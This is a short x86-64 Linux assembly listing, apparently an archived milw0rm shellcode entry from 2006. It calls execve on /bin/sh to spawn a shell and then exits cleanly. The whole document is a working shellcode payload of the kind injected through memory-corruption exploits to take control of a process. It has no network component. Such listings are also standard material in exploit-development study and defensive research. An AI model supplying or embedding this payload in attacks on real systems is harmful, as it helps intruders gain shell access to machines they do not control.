# [Linux/X86-64]
# Dummy for shellcode:
# execve("/bin/sh", ["/bin/sh"], NULL)
# hophet [at] gmail.com

.text
	.globl _start
_start:

	xorq	%rdx, %rdx
	movq	$0x68732f6e69622fff,%rbx
	shr	$0x8, %rbx
	push	%rbx
	movq	%rsp,%rdi
	xorq	%rax,%rax
	pushq	%rax
	pushq	%rdi
	movq	%rsp,%rsi
	mov	$0x3b,%al	# execve(3b)
	syscall

	pushq	$0x1
	pop	%rdi
	pushq	$0x3c		# exit(3c)
	pop	%rax
	syscall


# milw0rm.com [2006-11-02]